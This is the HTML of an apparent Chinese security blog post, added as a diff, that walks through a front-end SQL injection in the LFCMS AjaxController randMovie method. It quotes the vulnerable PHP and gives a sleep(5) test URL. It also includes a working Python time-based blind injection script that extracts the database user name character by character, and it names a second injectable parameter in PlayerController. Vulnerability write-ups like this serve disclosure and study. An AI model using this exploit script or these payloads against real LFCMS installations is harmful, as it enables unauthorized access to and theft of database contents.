@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="LFCMS AjaxController.class.php 前台sql注入漏洞一、漏洞简介二、漏洞影响三、复现过程漏洞起始点位于&#x2F;Application&#x2F;Home&#x2F;Controller&#x2F;AjaxController.class.php文件中的randMovie方法，代码如下  第七行代码中调用了Ajax模型中的randMovie方法，同时limit和category是我们输入的可控的参数，跟进r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/LFCMS/LFCMS%20AjaxController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="LFCMS AjaxController.class.php 前台sql注入漏洞一、漏洞简介二、漏洞影响三、复现过程漏洞起始点位于&#x2F;Application&#x2F;Home&#x2F;Controller&#x2F;AjaxController.class.php文件中的randMovie方法，代码如下  第七行代码中调用了Ajax模型中的randMovie方法，同时limit和category是我们输入的可控的参数，跟进r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="article:published_time" content="2022-07-08T06:25:58.920Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.673Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-LFCMS/LFCMS AjaxController.class.php 前台sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/LFCMS/LFCMS%20AjaxController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.920Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="LFCMS-AjaxController-class-php-前台sql注入漏洞"><a href="#LFCMS-AjaxController-class-php-前台sql注入漏洞" class="headerlink" title="LFCMS AjaxController.class.php 前台sql注入漏洞"></a>LFCMS AjaxController.class.php 前台sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞起始点位于<code>/Application/Home/Controller/AjaxController.class.php</code>文件中的<code>randMovie</code>方法，代码如下</p>
+<p><img src="/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>第七行代码中调用了<code>Ajax</code>模型中的<code>randMovie</code>方法，同时<code>limit</code>和<code>category</code>是我们输入的可控的参数，跟进<code>randMovie</code>方法</p>
+<pre><code>public function randMovie($limit=6,$category=&#39;&#39;) &#123;
+    if($category) &#123;
+        $type=&#39;and category=&#39;.$category;
+    &#125;
+    $prefix=C(&#39;DB_PREFIX&#39;);
+    $mlist=M()-&gt;query(&#39;SELECT * FROM `&#39;.$prefix.&#39;movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `&#39;.$prefix.&#39;movie`)-(SELECT MIN(id) FROM `&#39;.$prefix.&#39;movie`))+(SELECT MIN(id) FROM `&#39;.$prefix.&#39;movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx &#39;.$type.&#39; ORDER BY t1.id LIMIT &#39;.$limit);
+    foreach($mlist as $key=&gt;$value) &#123;
+        $list[$key]=D(&#39;Tag&#39;)-&gt;movieChange($value,&#39;movie&#39;);
+    &#125;
+    return $list;
+&#125;
+</code></pre>
+<p>在这里注意到<code>$type</code>与<code>$limit</code>在<code>sql</code>语句执行时均没有被单引号包裹，直接拼接到语句当中，这里就存在了sql注入的可能，首先我们在<code>movie</code>表里放一条数据，看一下正常执行时sql语句是如何执行的</p>
+<p><img src="/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"></p>
+<p>查看数据库日志可以得到如下<code>sql</code>语句</p>
+<pre><code>SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx and category=2 ORDER BY t1.id LIMIT 1
+</code></pre>
+<p>接着来尝试下进行注入，测试链接如下</p>
+<pre><code>http://www.0-sec.org/index.php/Ajax/randMovie?limit=1&amp;category=2 and sleep(5)
+</code></pre>
+<p>页面确实延迟了5秒，那么接着看一下后端数据库的语句</p>
+<pre><code>SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx and category=2 and sleep(5) ORDER BY t1.id LIMIT 1
+</code></pre>
+<p>基本可以判断该处存在着可用的注入点，接下来编写脚本跑一下数据库用户名试试</p>
+<pre><code>import requests
+url = &#39;http://www.0-sec.org/index.php/Ajax/randMovie?limit=1&amp;category=2 and &#39;
+s = requests.session()
+result = &quot;&quot;
+for i in range(1,50):
+    print(&#39;==========================&#39;)
+    for j in range(32,127):
+        payload = &quot;if((ascii(substr((select user()),&#123;&#125;,1))=&#123;&#125;),sleep(5),0)&quot;.format(i,j)
+        temp = url+payload
+        try:
+            s.get(temp,timeout=5)
+        except:
+            result+= chr(j)
+            print(result)
+            break
+</code></pre>
+<p><img src="/resource/LFCMSAjaxController.class.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png"></p>
+<p>相同原理的利用点同样不止一个，如<code>/Application/Home/Controller/PlayerController.class.php</code>文件中的<code>down</code>方法调用了模型<code>movie</code>中的<code>getPlayerUrl</code>方法，该方法的<code>pid</code>参数同样可以注入</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7844">https://xz.aliyun.com/t/7844</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/LFCMS/LFCMS%20AjaxController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrok00aey8v150uz15qi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/LFCMS/LFCMS%20NewsController.class.php%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/LerxCMS/LerxCMS%206.5%20%E5%90%8E%E5%8F%B0ssrf%20getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
